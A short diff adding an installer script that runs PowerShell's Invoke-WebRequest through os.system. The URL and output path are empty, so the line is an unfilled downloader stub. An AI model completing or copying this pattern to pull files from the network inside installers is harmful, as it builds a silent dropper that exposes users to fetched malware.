+++ Installer/installer.py
@@ -1,0 +1,3 @@
+from os import system as cmd
+
+cmd(f'powershell Invoke-WebRequest "" -OutFile ""')
